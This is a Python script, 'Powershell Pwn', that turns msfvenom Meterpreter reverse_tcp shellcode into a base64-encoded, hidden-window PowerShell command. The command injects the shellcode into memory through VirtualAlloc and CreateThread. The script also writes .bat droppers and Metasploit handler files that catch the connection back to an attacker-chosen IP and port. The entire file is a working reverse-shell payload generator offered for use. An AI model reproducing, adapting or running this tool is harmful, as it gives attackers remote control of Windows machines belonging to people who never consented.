#!/usr/bin/python
#Powershell Encoded Command Generator
#Written by Ben Buchacher bcbuchacher [ at ] gmail.com

import os, sys, optparse, base64, subprocess, re
from optparse import OptionGroup

G  = "\033[32m"; # green
N  = "\033[0m";  # (normal


class asciifix(optparse.IndentedHelpFormatter): 
    def format_description(self, description):
        if description:
            return description + "\n"
        else:
            return ""


def usage():
  print """

HELP:

./pspwn -h

TARGET:
   --LHOST=IP          Ip to Connect Back to
   --LPORT_64=X64PORT  64Bit Port
   --LPORT_86=X86PORT  32Bit Port

OUTPUT:
   --msfrc             Create a Metasploit RC File
   --bat               Create BAT file payload

USAGE:

./pspwn --LPORT_64 4444 --LHOST=192.168.1.2 --msfrc
./pspwn --LPORT_86 4443 --LHOST=192.168.1.2 --msfrc --bat
./pspwn --LPORT_64 4444 --LHOST=192.168.1.2 
./pspwn --LPORT_86 4443 --LHOST=192.168.1.2 
./pspwn --LPORT_64 4443 --LPORT_86 4444 --LHOST=192.168.1.2 --msfrc
./pspwn --LPORT_64 4443 --LPORT_86 4444 --LHOST=192.168.1.2 --msfrc --bat

------------------------------------ """


def generate_msfrc(IP,x64PORT,x86PORT):
  if x64PORT != '0000':
    file = open("./msf_x64.rc", 'w+')
    file.write('set ExitOnSession false' + '\n' )
    file.write('set LHOST 0.0.0.0' + '\n')
    file.write('use multi/handler\n')
    file.write('set payload windows/x64/meterpreter/reverse_tcp\n')
    file.write('set LPORT ' + x64PORT + '\n')
    file.write('exploit -j' + '\n' )
    file.close()
  if x86PORT != '0000':
    file = open("./msf_x86.rc", 'w+')
    file.write('set ExitOnSession false' + '\n' )
    file.write('set payload windows/meterpreter/reverse_tcp' + '\n')
    file.write('set LPORT ' + x86PORT +'\n' )
    file.write('set ExitOnSession false' + '\n' )
    file.write('exploit -j' + '\n')
    file.close()

def generate_batfile(x64PORT,x86PORT,powershell_command):
  if x64PORT != '0000':
    file = open("./x64_payload.bat", 'w+')
    file.write("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + powershell_command )
    file.close()
  if x86PORT != '0000':
    file = open("./x86_payload.bat", 'w+')
    file.write("powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + powershell_command )
    file.close()

def menu():
  print """ 
8888888b.                                                   888               888 888      
888   Y88b                                                  888               888 888      
888    888                                                  888               888 888                              
888   d88P  .d88b.  888  888  888  .d88b.  888d888 .d8888b  88888b.   .d88b.  888 888        
8888888P"  d88""88b 888  888  888 d8P  Y8b 888P"   88K      888 "88b d8P  Y8b 888 888      
888        888  888 888  888  888 88888888 888     "Y8888b. 888  888 88888888 888 888      
888        Y88..88P Y88b 888 d88P Y8b.     888          X88 888  888 Y8b.     888 888      
888         "Y88P"   "Y8888888P"   "Y8888  888      88888P' 888  888  "Y8888  888 888            

                                                    8888888b.
                                                    888   Y88b    
                                                    888    888
                                                    888   d88P 888  888  888 88888b. 
                                                    8888888P"  888  888  888 888 "88b
                                                    888        888  888  888 888  888
                                                    888        Y88b 888 d88P 888  888
                                                    888         "Y8888888P"  888  888             

..::A Powershell Reverse Shell EncodedCommand Generator"""


def generate_payload(payload,IP,port):
        proc = subprocess.Popen("msfvenom -p %s LHOST=%s LPORT=%s" % (payload,IP,port), stdout=subprocess.PIPE, shell=True)
        data = proc.communicate()[0]
        #format = [";"," ","+",'"',"\n","buf="]
        data = data.replace(";", "")
        data = data.replace(" ", "")
        data = data.replace("+", "")
        data = data.replace('"', "")
        data = data.replace("\n", "")
        data = data.replace("buf=", "")
        data = data.rstrip()
        data = re.sub("\\\\x", "0x", data)
        counter = 0
        mesh = ""
        newdata = ""
        for line in data:
                mesh = mesh + line
                counter = counter + 1
                if counter == 4:
                        newdata = newdata + mesh + ","
                        mesh = ""
                        counter = 0
        shellcode = newdata[:-1]

        powershell_command = ('''$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = %s;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };''' % (shellcode))
        blank_command = ""
        for char in powershell_command:
          blank_command += char + "\x00"
          
        powershell_command = blank_command
        powershell_command = base64.b64encode(powershell_command)

        return powershell_command
   

if __name__=="__main__":
    parser = optparse.OptionParser("usage: %prog [options] \n",formatter=asciifix(), description=menu() )
    target = OptionGroup(parser, "TARGET")
    output = OptionGroup(parser, "OUTPUT")
    misc = OptionGroup(parser, "MISC")
    target.add_option("--LHOST", dest="IP", help="Ip to Connect Back to")
    target.add_option("--LPORT_64", dest="x64PORT", help="64Bit Port", type="string", default="0000")
    target.add_option("--LPORT_86", dest="x86PORT",help="32Bit Port", type="string", default="0000")
    output.add_option("--msfrc", dest="MSFRC", action="store_true",help="Create a Metasploit RC File",)
    output.add_option("--bat", dest="BATFILE", action="store_true",help="Create BAT file payload",)
    parser.add_option_group(target)
    parser.add_option_group(output)
    parser.add_option_group(misc)
    (options, args) = parser.parse_args()
    IP = options.IP
    x64PORT = options.x64PORT
    x86PORT = options.x86PORT
    MSFRC = options.MSFRC
    BATFILE = options.BATFILE
    if options.IP == None:
      usage()
    else:
      print G+"[STARTING] Powershell Pwn Version 1.0" +N
      if x64PORT != '0000':
        print G+"[INFO] Generating payload windows/x64/meterpreter/reverse_tcp IP:"+ IP + " Port:" + x64PORT +N
        port = x64PORT
        powershell_command = generate_payload("windows/x64/meterpreter/reverse_tcp", IP, port)
        if BATFILE == True:
          print G+"[INFO] Generating .BAT Payload" +N
          generate_batfile(x64PORT,x86PORT,powershell_command)
          print G+"[INFO] .BAT payload written to ./x64_payload.bat" +N 
        elif MSFRC == True:
            print G+"[INFO] Generating Metasploit RC File" +N
            generate_msfrc(IP,x64PORT,x86PORT)
            print G+"[INFO] Metasploit RC File written to ./msf_x64.rc" +N
        else:
          print "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + powershell_command
      if x86PORT != '0000':
        print G+"[INFO] Generating payload windows/meterpreter/reverse_tcp IP:"+ IP + " Port:" + x86PORT +N
        port = x86PORT
        powershell_command = generate_payload("windows/meterpreter/reverse_tcp", IP, port)
        if BATFILE == True:
          print G+"[INFO] Generating .BAT Payload" +N
          generate_batfile(x64PORT,x86PORT,powershell_command)
          print G+"[INFO] .BAT payload written to ./x86_payload.bat" +N
        elif MSFRC == True: 
          print G+"[INFO] Generating Metasploit RC File" +N
          generate_msfrc(IP,x64PORT,x86PORT)
          print G+"[INFO] Metasploit RC File written to ./msf_x86.rc" +N
        else:
          print "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand " + powershell_command
      print G+"[DONE] Finished " +N
      sys.exit(1)